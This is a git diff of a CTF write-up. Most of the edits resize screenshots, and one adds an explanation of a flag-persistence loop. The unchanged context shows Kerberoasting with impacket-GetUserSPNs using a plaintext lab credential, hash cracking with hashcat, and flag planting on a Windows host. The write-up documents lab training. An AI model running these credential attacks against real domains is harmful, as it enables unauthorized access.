@@ -82,7 +82,7 @@ After i found a valid login i used it to perform a kereroast attack on the domai
     impacket-GetUserSPNs -request -dc-ip 10.109.124.214 kingofthehill.local/ghostadmin:Resurrect1 > output.txt
 
 
-<img width="1318" height="88" alt="image" src="https://github.com/user-attachments/assets/90c24179-b6ba-4ad0-9ea3-e925cc3e6a4f" />
+<img width="800" height="88" alt="image" src="https://github.com/user-attachments/assets/90c24179-b6ba-4ad0-9ea3-e925cc3e6a4f" />
 
 
 Now that i got the kereberos hashes it was time to crack them with hashcat.
@@ -91,9 +91,9 @@ Now that i got the kereberos hashes it was time to crack them with hashcat.
     hashcat -a 0 output.txt /usr/share/wordlists/rockyou.txt.gz
     
 
-<img width="682" height="103" alt="image" src="https://github.com/user-attachments/assets/ab31f31a-e87d-42b7-b568-83aced193cec" />
+<img width="800" height="103" alt="image" src="https://github.com/user-attachments/assets/ab31f31a-e87d-42b7-b568-83aced193cec" />
 
-<img width="682" height="103" alt="image" src="https://github.com/user-attachments/assets/b9dbda38-b941-48a3-8307-b5f56aa8e237" />
+<img width="800" height="103" alt="image" src="https://github.com/user-attachments/assets/b9dbda38-b941-48a3-8307-b5f56aa8e237" />
 
 With my new credentials, i went ahead and ran nxc again to see what i could do with them.
 
@@ -118,7 +118,7 @@ NTLM hashes are special, instead of using hashcat to find the admin password you
 
 ---
 ## Defending Windows
-Once I got admin, I had to plant my flag and secure the machine so other hackers couldn't steal it. 
+Once I got admin, I had to plant my flag and secure the machine so other hackers couldn't steal it. I first used a simple echo command that would put the output into the file but eventually i started to thing about how to better secure it so, i made a looping bash script that checks if the flag is planted and if its not it plants a new flag with a read only attribute and a hidden one. 
 
 
     echo "FLAG-S3X7Q5K8M2T9R4BL" > C:\Users\Administrator\Desktop\flag.txt
@@ -138,6 +138,9 @@ Once I got admin, I had to plant my flag and secure the machine so other hackers
     }
     Start-Sleep -Seconds 2
     }
+
+ <img width="750" height="413" alt="image" src="https://github.com/user-attachments/assets/fd397f55-25f7-4b14-8edf-54b46715d600" />
+
 ---
 ## Attacking Linux
 
